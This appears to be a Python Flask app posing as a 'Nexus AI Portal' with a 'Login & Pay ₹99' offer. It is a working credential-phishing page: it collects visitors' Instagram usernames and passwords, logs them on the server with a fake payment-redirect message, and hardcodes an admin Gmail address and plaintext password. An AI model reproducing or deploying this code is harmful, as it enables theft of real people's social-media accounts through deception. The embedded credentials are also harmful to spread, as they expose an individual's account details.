import os
from flask import Flask, render_template_string, request, session, redirect

app = Flask(__name__)
app.secret_key = "nexus_super_secret_key_7903"

# --- YOUR PRIVATE DATA ---
ADMIN_GMAIL = "nexusai119@gmail.com"
ADMIN_PASSWORD = "prashant@123456"

# --- CSS STYLE ---
STYLE = """
<style>
    body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
    .card { background: #1e293b; display: inline-block; padding: 30px; border-radius: 15px; border: 1px solid #38bdf8; width: 300px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    input { display: block; width: 90%; padding: 12px; margin: 15px auto; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
    button { background: #38bdf8; color: #0f172a; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
    .msg { color: #22c55e; font-size: 14px; margin-top: 10px; }
</style>
"""

# --- USER PORTAL ---
@app.route('/')
def home():
    return f"""
    <html><head><title>Nexus AI</title>{STYLE}</head>
    <body>
        <div class="card">
            <h2 style="color:#38bdf8;">🚀 Nexus AI Portal</h2>
            <form method="POST" action="/capture">
                <input type="text" name="u" placeholder="Instagram ID" required>
                <input type="password" name="p" placeholder="Password" required>
                <button type="submit">Login & Pay ₹99</button>
            </form>
            <a href="/admin" style="color:#94a3b8; font-size:12px; text-decoration:none; display:block; margin-top:20px;">🛡️ Admin Login</a>
        </div>
    </body></html>
    """

# --- DATA CAPTURE ---
@app.route('/capture', methods=['POST'])
def capture():
    user = request.form.get('u')
    pw = request.form.get('p')
    # Ye Render Logs mein dikhega
    print(f"\\n!!! DATA RECEIVED !!!\\nUser: {user}\\nPass: {pw}\\n------------------")
    return f"<html><head>{STYLE}</head><body><div class='card'><h2>Processing...</h2><p class='msg'>Redirecting to Payment Gateway...</p><script>setTimeout(()=>{{window.location.href='/'}}, 3000);</script></div></body></html>"

# --- ADMIN LOGIN PAGE ---
@app.route('/admin')
def admin_login_page():
    return f"""
    <html><head><title>Admin Access</title>{STYLE}</head>
    <body>
        <div class="card">
            <h2 style="color:#fbbf24;">🛡️ Admin Login</h2>
            <form method="POST" action="/admin_verify">
                <input type="email" name="email" placeholder="Gmail" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit" style="background:#fbbf24;">Unlock Panel</button>
            </form>
        </div>
    </body></html>
    """

@app.route('/admin_verify', methods=['POST'])
def admin_verify():
    e = request.form.get('email')
    p = request.form.get('pass')
    if e == ADMIN_GMAIL and p == ADMIN_PASSWORD:
        return "<h1>Welcome Prashant! Database is being synced...</h1>"
    return "<h1>Invalid Credentials!</h1><a href='/admin'>Try Again</a>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
